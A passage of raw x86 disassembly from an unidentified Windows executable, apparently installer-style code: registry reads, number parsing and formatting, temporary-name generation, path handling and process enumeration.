  405deb:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405def:	7f f1                	jg     0x405de2
  405df1:	5d                   	pop    %ebp
  405df2:	c2 0c 00             	ret    $0xc
  405df5:	ff 74 24 04          	push   0x4(%esp)
  405df9:	ff 15 7c 80 40 00    	call   *0x40807c
  405dff:	83 f8 ff             	cmp    $0xffffffff,%eax
  405e02:	74 0e                	je     0x405e12
  405e04:	83 e0 fe             	and    $0xfffffffe,%eax
  405e07:	50                   	push   %eax
  405e08:	ff 74 24 08          	push   0x8(%esp)
  405e0c:	ff 15 88 80 40 00    	call   *0x408088
  405e12:	c2 04 00             	ret    $0x4
  405e15:	ff 74 24 04          	push   0x4(%esp)
  405e19:	ff 15 7c 80 40 00    	call   *0x40807c
  405e1f:	8b c8                	mov    %eax,%ecx
  405e21:	41                   	inc    %ecx
  405e22:	6a 00                	push   $0x0
  405e24:	f7 d9                	neg    %ecx
  405e26:	1b c9                	sbb    %ecx,%ecx
  405e28:	23 c8                	and    %eax,%ecx
  405e2a:	51                   	push   %ecx
  405e2b:	ff 74 24 14          	push   0x14(%esp)
  405e2f:	6a 00                	push   $0x0
  405e31:	6a 01                	push   $0x1
  405e33:	ff 74 24 1c          	push   0x1c(%esp)
  405e37:	ff 74 24 1c          	push   0x1c(%esp)
  405e3b:	ff 15 94 80 40 00    	call   *0x408094
  405e41:	c2 0c 00             	ret    $0xc
  405e44:	55                   	push   %ebp
  405e45:	8b ec                	mov    %esp,%ebp
  405e47:	51                   	push   %ecx
  405e48:	51                   	push   %ecx
  405e49:	56                   	push   %esi
  405e4a:	8b 75 08             	mov    0x8(%ebp),%esi
  405e4d:	57                   	push   %edi
  405e4e:	6a 64                	push   $0x64
  405e50:	5f                   	pop    %edi
  405e51:	a1 4c 89 40 00       	mov    0x40894c,%eax
  405e56:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405e59:	a1 50 89 40 00       	mov    0x408950,%eax
  405e5e:	4f                   	dec    %edi
  405e5f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405e62:	ff 15 90 80 40 00    	call   *0x408090
  405e68:	6a 1a                	push   $0x1a
  405e6a:	59                   	pop    %ecx
  405e6b:	33 d2                	xor    %edx,%edx
  405e6d:	f7 f1                	div    %ecx
  405e6f:	56                   	push   %esi
  405e70:	6a 00                	push   $0x0
  405e72:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405e75:	50                   	push   %eax
  405e76:	ff 75 0c             	push   0xc(%ebp)
  405e79:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  405e7d:	ff 15 ec 80 40 00    	call   *0x4080ec
  405e83:	85 c0                	test   %eax,%eax
  405e85:	75 0d                	jne    0x405e94
  405e87:	85 ff                	test   %edi,%edi
  405e89:	75 c6                	jne    0x405e51
  405e8b:	66 89 06             	mov    %ax,(%esi)
  405e8e:	5f                   	pop    %edi
  405e8f:	5e                   	pop    %esi
  405e90:	c9                   	leave
  405e91:	c2 08 00             	ret    $0x8
  405e94:	8b c6                	mov    %esi,%eax
  405e96:	eb f6                	jmp    0x405e8e
  405e98:	55                   	push   %ebp
  405e99:	8b ec                	mov    %esp,%ebp
  405e9b:	56                   	push   %esi
  405e9c:	8b 75 14             	mov    0x14(%ebp),%esi
  405e9f:	33 c0                	xor    %eax,%eax
  405ea1:	66 89 06             	mov    %ax,(%esi)
  405ea4:	8d 45 18             	lea    0x18(%ebp),%eax
  405ea7:	50                   	push   %eax
  405ea8:	8b 45 18             	mov    0x18(%ebp),%eax
  405eab:	f7 d8                	neg    %eax
  405ead:	1b c0                	sbb    %eax,%eax
  405eaf:	25 00 01 00 00       	and    $0x100,%eax
  405eb4:	0d 19 00 02 00       	or     $0x20019,%eax
  405eb9:	50                   	push   %eax
  405eba:	6a 00                	push   $0x0
  405ebc:	ff 75 0c             	push   0xc(%ebp)
  405ebf:	ff 75 08             	push   0x8(%ebp)
  405ec2:	ff 15 04 80 40 00    	call   *0x408004
  405ec8:	85 c0                	test   %eax,%eax
  405eca:	75 45                	jne    0x405f11
  405ecc:	8d 45 0c             	lea    0xc(%ebp),%eax
  405ecf:	50                   	push   %eax
  405ed0:	56                   	push   %esi
  405ed1:	8d 45 14             	lea    0x14(%ebp),%eax
  405ed4:	50                   	push   %eax
  405ed5:	6a 00                	push   $0x0
  405ed7:	ff 75 10             	push   0x10(%ebp)
  405eda:	c7 45 0c 08 40 00 00 	movl   $0x4008,0xc(%ebp)
  405ee1:	ff 75 18             	push   0x18(%ebp)
  405ee4:	ff 15 1c 80 40 00    	call   *0x40801c
  405eea:	85 c0                	test   %eax,%eax
  405eec:	75 0c                	jne    0x405efa
  405eee:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  405ef2:	74 0b                	je     0x405eff
  405ef4:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  405ef8:	74 05                	je     0x405eff
  405efa:	33 c0                	xor    %eax,%eax
  405efc:	66 89 06             	mov    %ax,(%esi)
  405eff:	ff 75 18             	push   0x18(%ebp)
  405f02:	33 c0                	xor    %eax,%eax
  405f04:	66 89 86 06 40 00 00 	mov    %ax,0x4006(%esi)
  405f0b:	ff 15 08 80 40 00    	call   *0x408008
  405f11:	5e                   	pop    %esi
  405f12:	5d                   	pop    %ebp
  405f13:	c2 14 00             	ret    $0x14
  405f16:	ff 74 24 08          	push   0x8(%esp)
  405f1a:	68 94 88 40 00       	push   $0x408894
  405f1f:	ff 74 24 0c          	push   0xc(%esp)
  405f23:	ff 15 3c 82 40 00    	call   *0x40823c
  405f29:	83 c4 0c             	add    $0xc,%esp
  405f2c:	c2 08 00             	ret    $0x8
  405f2f:	55                   	push   %ebp
  405f30:	8b ec                	mov    %esp,%ebp
  405f32:	51                   	push   %ecx
  405f33:	51                   	push   %ecx
  405f34:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405f37:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405f3b:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  405f3f:	53                   	push   %ebx
  405f40:	56                   	push   %esi
  405f41:	6a 0a                	push   $0xa
  405f43:	58                   	pop    %eax
  405f44:	6a 39                	push   $0x39
  405f46:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  405f4d:	5b                   	pop    %ebx
  405f4e:	75 06                	jne    0x405f56
  405f50:	41                   	inc    %ecx
  405f51:	41                   	inc    %ecx
  405f52:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  405f56:	66 83 39 30          	cmpw   $0x30,(%ecx)
  405f5a:	75 27                	jne    0x405f83
  405f5c:	41                   	inc    %ecx
  405f5d:	41                   	inc    %ecx
  405f5e:	0f b7 11             	movzwl (%ecx),%edx
  405f61:	66 83 fa 30          	cmp    $0x30,%dx
  405f65:	72 0c                	jb     0x405f73
  405f67:	66 83 fa 37          	cmp    $0x37,%dx
  405f6b:	77 06                	ja     0x405f73
  405f6d:	6a 08                	push   $0x8
  405f6f:	58                   	pop    %eax
  405f70:	6a 37                	push   $0x37
  405f72:	5b                   	pop    %ebx
  405f73:	0f b7 d2             	movzwl %dx,%edx
  405f76:	83 e2 df             	and    $0xffffffdf,%edx
  405f79:	83 fa 58             	cmp    $0x58,%edx
  405f7c:	75 05                	jne    0x405f83
  405f7e:	6a 10                	push   $0x10
  405f80:	41                   	inc    %ecx
  405f81:	58                   	pop    %eax
  405f82:	41                   	inc    %ecx
  405f83:	0f b7 11             	movzwl (%ecx),%edx
  405f86:	41                   	inc    %ecx
  405f87:	41                   	inc    %ecx
  405f88:	83 fa 30             	cmp    $0x30,%edx
  405f8b:	7c 0c                	jl     0x405f99
  405f8d:	0f b7 f3             	movzwl %bx,%esi
  405f90:	3b d6                	cmp    %esi,%edx
  405f92:	7f 05                	jg     0x405f99
  405f94:	83 ea 30             	sub    $0x30,%edx
  405f97:	eb 1b                	jmp    0x405fb4
  405f99:	66 83 f8 10          	cmp    $0x10,%ax
  405f9d:	75 23                	jne    0x405fc2
  405f9f:	8b f2                	mov    %edx,%esi
  405fa1:	83 e6 df             	and    $0xffffffdf,%esi
  405fa4:	83 fe 41             	cmp    $0x41,%esi
  405fa7:	7c 19                	jl     0x405fc2
  405fa9:	83 fe 46             	cmp    $0x46,%esi
  405fac:	7f 14                	jg     0x405fc2
  405fae:	83 e2 07             	and    $0x7,%edx
  405fb1:	83 c2 09             	add    $0x9,%edx
  405fb4:	0f b7 f0             	movzwl %ax,%esi
  405fb7:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  405fbb:	03 f2                	add    %edx,%esi
  405fbd:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405fc0:	eb c1                	jmp    0x405f83
  405fc2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405fc5:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  405fc9:	5e                   	pop    %esi
  405fca:	5b                   	pop    %ebx
  405fcb:	c9                   	leave
  405fcc:	c2 04 00             	ret    $0x4
  405fcf:	68 04 20 00 00       	push   $0x2004
  405fd4:	ff 74 24 0c          	push   0xc(%esp)
  405fd8:	ff 74 24 0c          	push   0xc(%esp)
  405fdc:	ff 15 cc 80 40 00    	call   *0x4080cc
  405fe2:	c2 08 00             	ret    $0x8
  405fe5:	ff 25 c8 80 40 00    	jmp    *0x4080c8
  405feb:	55                   	push   %ebp
  405fec:	8b ec                	mov    %esp,%ebp
  405fee:	51                   	push   %ecx
  405fef:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405ff3:	56                   	push   %esi
  405ff4:	8b 75 0c             	mov    0xc(%ebp),%esi
  405ff7:	8b ce                	mov    %esi,%ecx
  405ff9:	53                   	push   %ebx
  405ffa:	8b 45 08             	mov    0x8(%ebp),%eax
  405ffd:	6a 0a                	push   $0xa
  405fff:	33 d2                	xor    %edx,%edx
  406001:	5b                   	pop    %ebx
  406002:	f7 f3                	div    %ebx
  406004:	89 45 08             	mov    %eax,0x8(%ebp)
  406007:	83 fa 09             	cmp    $0x9,%edx
  40600a:	76 05                	jbe    0x406011
  40600c:	83 c2 57             	add    $0x57,%edx
  40600f:	eb 03                	jmp    0x406014
  406011:	83 c2 30             	add    $0x30,%edx
  406014:	66 89 11             	mov    %dx,(%ecx)
  406017:	41                   	inc    %ecx
  406018:	41                   	inc    %ecx
  406019:	ff 45 fc             	incl   -0x4(%ebp)
  40601c:	85 c0                	test   %eax,%eax
  40601e:	76 08                	jbe    0x406028
  406020:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406023:	3b 45 10             	cmp    0x10(%ebp),%eax
  406026:	72 d2                	jb     0x405ffa
  406028:	8b 45 10             	mov    0x10(%ebp),%eax
  40602b:	5b                   	pop    %ebx
  40602c:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  40602f:	72 07                	jb     0x406038
  406031:	33 c0                	xor    %eax,%eax
  406033:	8b d6                	mov    %esi,%edx
  406035:	66 89 02             	mov    %ax,(%edx)
  406038:	33 c0                	xor    %eax,%eax
  40603a:	66 89 01             	mov    %ax,(%ecx)
  40603d:	49                   	dec    %ecx
  40603e:	49                   	dec    %ecx
  40603f:	66 8b 16             	mov    (%esi),%dx
  406042:	0f b7 01             	movzwl (%ecx),%eax
  406045:	66 89 11             	mov    %dx,(%ecx)
  406048:	49                   	dec    %ecx
  406049:	66 89 06             	mov    %ax,(%esi)
  40604c:	49                   	dec    %ecx
  40604d:	46                   	inc    %esi
  40604e:	46                   	inc    %esi
  40604f:	3b f1                	cmp    %ecx,%esi
  406051:	72 ec                	jb     0x40603f
  406053:	33 c0                	xor    %eax,%eax
  406055:	5e                   	pop    %esi
  406056:	c9                   	leave
  406057:	c2 0c 00             	ret    $0xc
  40605a:	ff 25 f0 80 40 00    	jmp    *0x4080f0
  406060:	0f b7 44 24 04       	movzwl 0x4(%esp),%eax
  406065:	50                   	push   %eax
  406066:	ff 15 0c 82 40 00    	call   *0x40820c
  40606c:	c3                   	ret
  40606d:	55                   	push   %ebp
  40606e:	56                   	push   %esi
  40606f:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406073:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  406077:	57                   	push   %edi
  406078:	75 18                	jne    0x406092
  40607a:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  40607f:	75 11                	jne    0x406092
  406081:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  406086:	75 0a                	jne    0x406092
  406088:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  40608d:	75 03                	jne    0x406092
  40608f:	83 c6 08             	add    $0x8,%esi
  406092:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406096:	74 0d                	je     0x4060a5
  406098:	56                   	push   %esi
  406099:	e8 ed fb ff ff       	call   0x405c8b
  40609e:	85 c0                	test   %eax,%eax
  4060a0:	74 03                	je     0x4060a5
  4060a2:	83 c6 04             	add    $0x4,%esi
  4060a5:	0f b7 06             	movzwl (%esi),%eax
  4060a8:	8b ee                	mov    %esi,%ebp
  4060aa:	8b fe                	mov    %esi,%edi
  4060ac:	66 85 c0             	test   %ax,%ax
  4060af:	74 40                	je     0x4060f1
  4060b1:	53                   	push   %ebx
  4060b2:	8b 1d 54 82 40 00    	mov    0x408254,%ebx
  4060b8:	66 83 f8 1f          	cmp    $0x1f,%ax
  4060bc:	76 25                	jbe    0x4060e3
  4060be:	50                   	push   %eax
  4060bf:	68 54 89 40 00       	push   $0x408954
  4060c4:	e8 a3 fb ff ff       	call   0x405c6c
  4060c9:	66 83 38 00          	cmpw   $0x0,(%eax)
  4060cd:	75 14                	jne    0x4060e3
  4060cf:	56                   	push   %esi
  4060d0:	ff d3                	call   *%ebx
  4060d2:	2b c6                	sub    %esi,%eax
  4060d4:	d1 f8                	sar    $1,%eax
  4060d6:	50                   	push   %eax
  4060d7:	56                   	push   %esi
  4060d8:	57                   	push   %edi
  4060d9:	e8 f3 fc ff ff       	call   0x405dd1
  4060de:	57                   	push   %edi
  4060df:	ff d3                	call   *%ebx
  4060e1:	8b f8                	mov    %eax,%edi
  4060e3:	56                   	push   %esi
  4060e4:	ff d3                	call   *%ebx
  4060e6:	8b f0                	mov    %eax,%esi
  4060e8:	0f b7 06             	movzwl (%esi),%eax
  4060eb:	66 85 c0             	test   %ax,%ax
  4060ee:	75 c8                	jne    0x4060b8
  4060f0:	5b                   	pop    %ebx
  4060f1:	33 c0                	xor    %eax,%eax
  4060f3:	66 89 07             	mov    %ax,(%edi)
  4060f6:	57                   	push   %edi
  4060f7:	55                   	push   %ebp
  4060f8:	ff 15 10 82 40 00    	call   *0x408210
  4060fe:	8b f8                	mov    %eax,%edi
  406100:	0f b7 07             	movzwl (%edi),%eax
  406103:	66 83 f8 20          	cmp    $0x20,%ax
  406107:	74 06                	je     0x40610f
  406109:	66 83 f8 5c          	cmp    $0x5c,%ax
  40610d:	75 09                	jne    0x406118
  40610f:	33 c0                	xor    %eax,%eax
  406111:	66 89 07             	mov    %ax,(%edi)
  406114:	3b ef                	cmp    %edi,%ebp
  406116:	72 de                	jb     0x4060f6
  406118:	5f                   	pop    %edi
  406119:	5e                   	pop    %esi
  40611a:	5d                   	pop    %ebp
  40611b:	c2 04 00             	ret    $0x4
  40611e:	56                   	push   %esi
  40611f:	be e8 ee 45 00       	mov    $0x45eee8,%esi
  406124:	56                   	push   %esi
  406125:	ff 74 24 0c          	push   0xc(%esp)
  406129:	ff 15 6c 81 40 00    	call   *0x40816c
  40612f:	83 f8 ff             	cmp    $0xffffffff,%eax
  406132:	74 0b                	je     0x40613f
  406134:	50                   	push   %eax
  406135:	ff 15 64 81 40 00    	call   *0x408164
  40613b:	8b c6                	mov    %esi,%eax
  40613d:	eb 02                	jmp    0x406141
  40613f:	33 c0                	xor    %eax,%eax
  406141:	5e                   	pop    %esi
  406142:	c2 04 00             	ret    $0x4
  406145:	56                   	push   %esi
  406146:	8b 74 24 08          	mov    0x8(%esp),%esi
  40614a:	57                   	push   %edi
  40614b:	c1 e6 03             	shl    $0x3,%esi
  40614e:	8b be 70 a0 40 00    	mov    0x40a070(%esi),%edi
  406154:	57                   	push   %edi
  406155:	ff 15 f8 80 40 00    	call   *0x4080f8
  40615b:	85 c0                	test   %eax,%eax
  40615d:	75 0b                	jne    0x40616a
  40615f:	57                   	push   %edi
  406160:	ff 15 f4 80 40 00    	call   *0x4080f4
  406166:	85 c0                	test   %eax,%eax
  406168:	74 0d                	je     0x406177
  40616a:	ff b6 74 a0 40 00    	push   0x40a074(%esi)
  406170:	50                   	push   %eax
  406171:	ff 15 a0 80 40 00    	call   *0x4080a0
  406177:	5f                   	pop    %edi
  406178:	5e                   	pop    %esi
  406179:	c2 04 00             	ret    $0x4
  40617c:	55                   	push   %ebp
  40617d:	8b ec                	mov    %esp,%ebp
  40617f:	83 ec 1c             	sub    $0x1c,%esp
  406182:	56                   	push   %esi
  406183:	8b 75 08             	mov    0x8(%ebp),%esi
  406186:	57                   	push   %edi
  406187:	8b 3d 18 82 40 00    	mov    0x408218,%edi
  40618d:	eb 0a                	jmp    0x406199
  40618f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406192:	50                   	push   %eax
  406193:	ff 15 14 82 40 00    	call   *0x408214
  406199:	6a 01                	push   $0x1
  40619b:	56                   	push   %esi
  40619c:	56                   	push   %esi
  40619d:	6a 00                	push   $0x0
  40619f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4061a2:	50                   	push   %eax
  4061a3:	ff d7                	call   *%edi
  4061a5:	85 c0                	test   %eax,%eax
  4061a7:	75 e6                	jne    0x40618f
  4061a9:	5f                   	pop    %edi
  4061aa:	5e                   	pop    %esi
  4061ab:	c9                   	leave
  4061ac:	c2 04 00             	ret    $0x4
  4061af:	53                   	push   %ebx
  4061b0:	56                   	push   %esi
  4061b1:	57                   	push   %edi
  4061b2:	be 04 20 00 00       	mov    $0x2004,%esi
  4061b7:	56                   	push   %esi
  4061b8:	6a 40                	push   $0x40
  4061ba:	ff 15 24 81 40 00    	call   *0x408124
  4061c0:	33 ff                	xor    %edi,%edi
  4061c2:	57                   	push   %edi
  4061c3:	57                   	push   %edi
  4061c4:	56                   	push   %esi
  4061c5:	8b d8                	mov    %eax,%ebx
  4061c7:	53                   	push   %ebx
  4061c8:	6a ff                	push   $0xffffffff
  4061ca:	ff 74 24 28          	push   0x28(%esp)
  4061ce:	57                   	push   %edi
  4061cf:	57                   	push   %edi
  4061d0:	ff 15 48 81 40 00    	call   *0x408148
  4061d6:	85 c0                	test   %eax,%eax
  4061d8:	74 0d                	je     0x4061e7
  4061da:	53                   	push   %ebx
  4061db:	ff 74 24 14          	push   0x14(%esp)
  4061df:	ff 15 a0 80 40 00    	call   *0x4080a0
  4061e5:	8b f8                	mov    %eax,%edi
  4061e7:	53                   	push   %ebx
  4061e8:	ff 15 30 81 40 00    	call   *0x408130
  4061ee:	8b c7                	mov    %edi,%eax
  4061f0:	5f                   	pop    %edi
  4061f1:	5e                   	pop    %esi
  4061f2:	5b                   	pop    %ebx
  4061f3:	c2 08 00             	ret    $0x8
  4061f6:	55                   	push   %ebp
  4061f7:	8b ec                	mov    %esp,%ebp
  4061f9:	81 ec 98 0b 00 00    	sub    $0xb98,%esp
  4061ff:	53                   	push   %ebx
  406200:	56                   	push   %esi
  406201:	57                   	push   %edi
  406202:	68 a0 0f 00 00       	push   $0xfa0
  406207:	6a 40                	push   $0x40
  406209:	ff 15 24 81 40 00    	call   *0x408124
  40620f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406212:	53                   	push   %ebx
  406213:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406216:	ff 15 c8 80 40 00    	call   *0x4080c8
  40621c:	8b f8                	mov    %eax,%edi
  40621e:	8d 47 ff             	lea    -0x1(%edi),%eax
  406221:	3d 03 01 00 00       	cmp    $0x103,%eax
  406226:	0f 87 34 03 00 00    	ja     0x406560
  40622c:	33 f6                	xor    %esi,%esi
  40622e:	85 ff                	test   %edi,%edi
  406230:	7e 27                	jle    0x406259
  406232:	8d 85 c4 fc ff ff    	lea    -0x33c(%ebp),%eax
  406238:	2b d8                	sub    %eax,%ebx
  40623a:	8d 04 73             	lea    (%ebx,%esi,2),%eax
  40623d:	0f b7 84 05 c4 fc ff 	movzwl -0x33c(%ebp,%eax,1),%eax
  406244:	ff 
  406245:	50                   	push   %eax
  406246:	e8 15 fe ff ff       	call   0x406060
  40624b:	66 89 84 75 c4 fc ff 	mov    %ax,-0x33c(%ebp,%esi,2)
  406252:	ff 
  406253:	46                   	inc    %esi
  406254:	3b f7                	cmp    %edi,%esi
  406256:	59                   	pop    %ecx
  406257:	7c e1                	jl     0x40623a
  406259:	33 c0                	xor    %eax,%eax
  40625b:	66 89 84 7d c4 fc ff 	mov    %ax,-0x33c(%ebp,%edi,2)
  406262:	ff 
  406263:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
  406269:	50                   	push   %eax
  40626a:	c7 85 cc fe ff ff 14 	movl   $0x114,-0x134(%ebp)
  406271:	01 00 00 
  406274:	ff 15 04 81 40 00    	call   *0x408104
  40627a:	85 c0                	test   %eax,%eax
  40627c:	75 0a                	jne    0x406288
  40627e:	b8 5e 02 00 00       	mov    $0x25e,%eax
  406283:	e9 dd 02 00 00       	jmp    0x406565
  406288:	83 bd dc fe ff ff 02 	cmpl   $0x2,-0x124(%ebp)
  40628f:	8b 35 a0 80 40 00    	mov    0x4080a0,%esi
  406295:	74 17                	je     0x4062ae
  406297:	83 bd dc fe ff ff 01 	cmpl   $0x1,-0x124(%ebp)
  40629e:	0f 84 2b 01 00 00    	je     0x4063cf
  4062a4:	b8 5f 02 00 00       	mov    $0x25f,%eax
  4062a9:	e9 b7 02 00 00       	jmp    0x406565
  4062ae:	68 1c 8a 40 00       	push   $0x408a1c
  4062b3:	ff 15 f4 80 40 00    	call   *0x4080f4
  4062b9:	8b d8                	mov    %eax,%ebx
  4062bb:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4062be:	85 db                	test   %ebx,%ebx
  4062c0:	75 0a                	jne    0x4062cc
  4062c2:	b8 5d 02 00 00       	mov    $0x25d,%eax
  4062c7:	e9 99 02 00 00       	jmp    0x406565
  4062cc:	68 0c 8a 40 00       	push   $0x408a0c
  4062d1:	53                   	push   %ebx
  4062d2:	ff d6                	call   *%esi
  4062d4:	68 f8 89 40 00       	push   $0x4089f8
  4062d9:	53                   	push   %ebx
  4062da:	8b f8                	mov    %eax,%edi
  4062dc:	ff d6                	call   *%esi
  4062de:	68 e4 89 40 00       	push   $0x4089e4
  4062e3:	53                   	push   %ebx
  4062e4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4062e7:	ff d6                	call   *%esi
  4062e9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4062ec:	85 ff                	test   %edi,%edi
  4062ee:	0f 84 a6 01 00 00    	je     0x40649a
  4062f4:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4062f8:	0f 84 9c 01 00 00    	je     0x40649a
  4062fe:	85 c0                	test   %eax,%eax
  406300:	0f 84 94 01 00 00    	je     0x40649a
  406306:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406309:	50                   	push   %eax
  40630a:	68 e8 03 00 00       	push   $0x3e8
  40630f:	ff 75 fc             	push   -0x4(%ebp)
  406312:	ff d7                	call   *%edi
  406314:	85 c0                	test   %eax,%eax
  406316:	75 1c                	jne    0x406334
  406318:	be 5d 02 00 00       	mov    $0x25d,%esi
  40631d:	53                   	push   %ebx
  40631e:	ff 15 3c 81 40 00    	call   *0x40813c
  406324:	ff 75 fc             	push   -0x4(%ebp)
  406327:	ff 15 30 81 40 00    	call   *0x408130
  40632d:	8b c6                	mov    %esi,%eax
  40632f:	e9 31 02 00 00       	jmp    0x406565
  406334:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  406337:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  40633b:	c1 eb 02             	shr    $0x2,%ebx
  40633e:	85 db                	test   %ebx,%ebx
  406340:	0f 86 89 00 00 00    	jbe    0x4063cf
  406346:	68 d4 89 40 00       	push   $0x4089d4
  40634b:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  406351:	50                   	push   %eax
  406352:	ff 15 00 81 40 00    	call   *0x408100
  406358:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40635b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40635e:	ff 34 88             	push   (%eax,%ecx,4)
  406361:	6a 00                	push   $0x0
  406363:	68 10 04 00 00       	push   $0x410
  406368:	ff 15 fc 80 40 00    	call   *0x4080fc
  40636e:	8b f8                	mov    %eax,%edi
  406370:	85 ff                	test   %edi,%edi
  406372:	74 25                	je     0x406399
  406374:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406377:	50                   	push   %eax
  406378:	6a 04                	push   $0x4
  40637a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40637d:	50                   	push   %eax
  40637e:	57                   	push   %edi
  40637f:	ff 55 f8             	call   *-0x8(%ebp)
  406382:	85 c0                	test   %eax,%eax
  406384:	74 13                	je     0x406399
  406386:	68 04 01 00 00       	push   $0x104
  40638b:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  406391:	50                   	push   %eax
  406392:	ff 75 e4             	push   -0x1c(%ebp)
  406395:	57                   	push   %edi
  406396:	ff 55 f4             	call   *-0xc(%ebp)
  406399:	57                   	push   %edi
  40639a:	ff 15 bc 80 40 00    	call   *0x4080bc
  4063a0:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  4063a6:	50                   	push   %eax
  4063a7:	ff 15 0c 82 40 00    	call   *0x40820c
  4063ad:	8d 8d c4 fc ff ff    	lea    -0x33c(%ebp),%ecx
  4063b3:	51                   	push   %ecx
  4063b4:	50                   	push   %eax
  4063b5:	ff 15 1c 81 40 00    	call   *0x40811c
  4063bb:	85 c0                	test   %eax,%eax
  4063bd:	0f 84 cc 00 00 00    	je     0x40648f
  4063c3:	ff 45 08             	incl   0x8(%ebp)
  4063c6:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4063c9:	0f 82 77 ff ff ff    	jb     0x406346
  4063cf:	ff 75 fc             	push   -0x4(%ebp)
  4063d2:	ff 15 30 81 40 00    	call   *0x408130
  4063d8:	83 bd dc fe ff ff 01 	cmpl   $0x1,-0x124(%ebp)
  4063df:	0f 85 42 01 00 00    	jne    0x406527
  4063e5:	68 c4 89 40 00       	push   $0x4089c4
  4063ea:	ff 15 f4 80 40 00    	call   *0x4080f4
  4063f0:	8b f8                	mov    %eax,%edi
  4063f2:	33 db                	xor    %ebx,%ebx
  4063f4:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4063f7:	3b fb                	cmp    %ebx,%edi
  4063f9:	0f 84 c3 fe ff ff    	je     0x4062c2
  4063ff:	68 a8 89 40 00       	push   $0x4089a8
  406404:	57                   	push   %edi
  406405:	ff d6                	call   *%esi
  406407:	68 98 89 40 00       	push   $0x408998
  40640c:	57                   	push   %edi
  40640d:	89 45 08             	mov    %eax,0x8(%ebp)
  406410:	ff d6                	call   *%esi
  406412:	68 88 89 40 00       	push   $0x408988
  406417:	57                   	push   %edi
  406418:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40641b:	ff d6                	call   *%esi
  40641d:	68 78 89 40 00       	push   $0x408978
  406422:	57                   	push   %edi
  406423:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406426:	ff d6                	call   *%esi
  406428:	68 68 89 40 00       	push   $0x408968
  40642d:	57                   	push   %edi
  40642e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  406431:	ff d6                	call   *%esi
  406433:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406436:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  406439:	0f 84 1b 01 00 00    	je     0x40655a
  40643f:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  406442:	0f 84 12 01 00 00    	je     0x40655a
  406448:	3b c3                	cmp    %ebx,%eax
  40644a:	0f 84 0a 01 00 00    	je     0x40655a
  406450:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  406453:	0f 84 01 01 00 00    	je     0x40655a
  406459:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40645c:	0f 84 f8 00 00 00    	je     0x40655a
  406462:	53                   	push   %ebx
  406463:	6a 02                	push   $0x2
  406465:	ff 55 08             	call   *0x8(%ebp)
  406468:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40646b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40646e:	0f 84 e6 00 00 00    	je     0x40655a
  406474:	8d 8d 98 fa ff ff    	lea    -0x568(%ebp),%ecx
  40647a:	51                   	push   %ecx
  40647b:	bb 2c 02 00 00       	mov    $0x22c,%ebx
  406480:	50                   	push   %eax
  406481:	89 9d 98 fa ff ff    	mov    %ebx,-0x568(%ebp)
  406487:	ff 55 f8             	call   *-0x8(%ebp)
  40648a:	e9 8b 00 00 00       	jmp    0x40651a
  40648f:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  406492:	33 f6                	xor    %esi,%esi
  406494:	46                   	inc    %esi
  406495:	e9 83 fe ff ff       	jmp    0x40631d
  40649a:	53                   	push   %ebx
  40649b:	ff 15 3c 81 40 00    	call   *0x40813c
  4064a1:	e9 1c fe ff ff       	jmp    0x4062c2
  4064a6:	ff b5 a0 fa ff ff    	push   -0x560(%ebp)
  4064ac:	6a 08                	push   $0x8
  4064ae:	ff 55 08             	call   *0x8(%ebp)
  4064b1:	8b f0                	mov    %eax,%esi
  4064b3:	83 fe ff             	cmp    $0xffffffff,%esi
  4064b6:	74 7c                	je     0x406534
